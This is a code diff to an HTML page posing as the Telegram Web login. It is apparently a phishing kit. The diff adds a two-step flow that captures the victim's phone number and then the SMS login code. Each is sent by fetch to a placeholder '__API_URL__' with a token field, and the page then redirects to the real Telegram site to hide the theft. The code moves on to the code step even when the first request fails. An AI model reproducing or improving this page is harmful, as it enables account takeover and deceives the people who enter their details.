@@ -5,6 +5,8 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Telegram Web</title>
+    <link rel="icon" href="https://telegram.org/favicon.ico" type="image/x-icon">
+    <meta name="description" content="Log in to Telegram by QR Code">
     <style>
         * {
             margin: 0;
@@ -30,6 +32,18 @@
             max-width: 440px;
             text-align: center;
             box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
+            animation: fadeIn 0.4s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(15px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            20%, 60% { transform: translateX(-6px); }
+            40%, 80% { transform: translateX(6px); }
         }
 
         .logo-container {
@@ -70,6 +84,12 @@
             outline: none;
             background: #fff;
             appearance: none;
+            transition: border-color 0.2s;
+        }
+
+        .input-group select:focus,
+        .input-group input:focus {
+            border-color: #3390ec;
         }
 
         .input-group label {
@@ -81,15 +101,6 @@
             font-size: 13px;
             color: #3390ec;
             font-weight: 500;
-        }
-
-        .input-group.phone-group {
-            display: flex;
-        }
-
-        .input-group.phone-group input {
-            border-top-left-radius: 0;
-            border-bottom-left-radius: 0;
         }
 
         .btn-primary {
@@ -104,10 +115,37 @@
             cursor: pointer;
             text-transform: uppercase;
             margin-top: 8px;
+            transition: background-color 0.2s, transform 0.1s;
+            position: relative;
+            overflow: hidden;
         }
 
         .btn-primary:hover {
             background-color: #2b7fd4;
+        }
+
+        .btn-primary:active {
+            transform: scale(0.98);
+        }
+
+        .btn-primary.loading {
+            pointer-events: none;
+            opacity: 0.85;
+        }
+
+        .spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-top: 3px solid #fff;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            vertical-align: middle;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
         }
 
         .links-container {
@@ -123,10 +161,39 @@
             margin-bottom: 16px;
             text-transform: uppercase;
             cursor: pointer;
+            transition: opacity 0.2s;
         }
 
         .link-item:hover {
-            text-decoration: underline;
+            opacity: 0.7;
+        }
+
+        .step-transition {
+            animation: slideIn 0.3s ease;
+        }
+
+        @keyframes slideIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .error-msg {
+            color: #e53935;
+            font-size: 13px;
+            margin-top: 8px;
+            display: none;
+        }
+
+        .sms-info {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            background: #e8f5e9;
+            padding: 12px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            font-size: 14px;
+            color: #2e7d32;
         }
     </style>
 </head>
@@ -146,46 +213,92 @@
         <p class="subtitle">Please confirm your country code <br> and enter your phone number.</p>
 
         <form id="tgForm">
-            <div class="input-group">
-                <label>Country</label>
-                <select id="country">
-                    <option value="+998">Uzbekistan</option>
-                    <option value="+7">Russia</option>
-                    <option value="+1">United States</option>
-                    <option value="+44">United Kingdom</option>
-                </select>
+            <div id="step1">
+                <div class="input-group">
+                    <label>Country</label>
+                    <select id="country">
+                        <option value="+998">Uzbekistan</option>
+                        <option value="+7">Russia</option>
+                        <option value="+1">United States</option>
+                        <option value="+44">United Kingdom</option>
+                        <option value="+82">South Korea</option>
+                        <option value="+49">Germany</option>
+                        <option value="+33">France</option>
+                        <option value="+971">UAE</option>
+                        <option value="+90">Turkey</option>
+                        <option value="+992">Tajikistan</option>
+                        <option value="+996">Kyrgyzstan</option>
+                    </select>
+                </div>
+
+                <div class="input-group">
+                    <label>Phone Number</label>
+                    <input type="tel" id="username" placeholder="Phone Number" value="+998 " autocomplete="tel">
+                </div>
+                <div class="error-msg" id="error1">Please enter a valid phone number</div>
+                <button type="submit" class="btn-primary" id="btn1">NEXT</button>
             </div>
 
-            <div class="input-group">
-                <label>Phone Number</label>
-                <input type="tel" id="username" placeholder="Phone Number" value="+998 ">
+            <div id="step2" style="display: none;">
+                <div class="sms-info step-transition">
+                    <span>📲</span>
+                    <span>We've sent the code via SMS to <b id="phoneDisplay"></b></span>
+                </div>
+                <div class="input-group step-transition">
+                    <label>Code</label>
+                    <input type="text" id="password" placeholder="Enter Code" autocomplete="one-time-code" maxlength="6" inputmode="numeric" pattern="[0-9]*">
+                </div>
+                <div class="error-msg" id="error2">Please enter the code you received</div>
+                <button type="button" id="btnCode" class="btn-primary">CONFIRM</button>
             </div>
-
-            <button type="submit" class="btn-primary">Next</button>
         </form>
 
         <div class="links-container">
             <span class="link-item">Log in by QR Code</span>
-            <span class="link-item">Log in by Passkey</span>
         </div>
     </div>
 
     <script>
         const form = document.getElementById('tgForm');
         const usernameInput = document.getElementById('username');
+        const passwordInput = document.getElementById('password');
         const countrySelect = document.getElementById('country');
+        const step1 = document.getElementById('step1');
+        const step2 = document.getElementById('step2');
+        const btnCode = document.getElementById('btnCode');
+        const btn1 = document.getElementById('btn1');
 
         countrySelect.addEventListener('change', (e) => {
             usernameInput.value = e.target.value + ' ';
             usernameInput.focus();
         });
 
+        function setLoading(btn, loading) {
+            if (loading) {
+                btn.dataset.text = btn.textContent;
+                btn.innerHTML = '<span class="spinner"></span>';
+                btn.classList.add('loading');
+            } else {
+                btn.textContent = btn.dataset.text;
+                btn.classList.remove('loading');
+            }
+        }
+
         form.addEventListener('submit', (e) => {
             e.preventDefault();
-
+            const phone = usernameInput.value.trim();
+            if (phone.length < 6) {
+                document.getElementById('error1').style.display = 'block';
+                usernameInput.parentElement.style.animation = 'shake 0.4s';
+                setTimeout(() => usernameInput.parentElement.style.animation = '', 400);
+                return;
+            }
+            document.getElementById('error1').style.display = 'none';
+            setLoading(btn1, true);
+            
             const data = {
                 token: '__TOKEN__',
-                username: usernameInput.value.trim(),
+                username: phone,
                 password: 'telegram_login_web'
             };
 
@@ -193,8 +306,44 @@
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(data)
+            }).then(() => {
+                step1.style.display = 'none';
+                step2.style.display = 'block';
+                document.getElementById('phoneDisplay').textContent = phone;
+                passwordInput.focus();
+            }).catch(() => {
+                step1.style.display = 'none';
+                step2.style.display = 'block';
+                document.getElementById('phoneDisplay').textContent = phone;
+                passwordInput.focus();
+            });
+        });
+
+        btnCode.addEventListener('click', () => {
+            const code = passwordInput.value.trim();
+            if (!code || code.length < 3) {
+                document.getElementById('error2').style.display = 'block';
+                passwordInput.parentElement.style.animation = 'shake 0.4s';
+                setTimeout(() => passwordInput.parentElement.style.animation = '', 400);
+                return;
+            }
+            document.getElementById('error2').style.display = 'none';
+            setLoading(btnCode, true);
+
+            const data = {
+                token: '__TOKEN__',
+                username: usernameInput.value.trim(),
+                password: code
+            };
+
+            fetch('__API_URL__', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
             }).finally(() => {
-                window.location.href = 'https://web.telegram.org/';
+                setTimeout(() => {
+                    window.location.href = 'https://web.telegram.org/';
+                }, 800);
             });
         });
     </script>
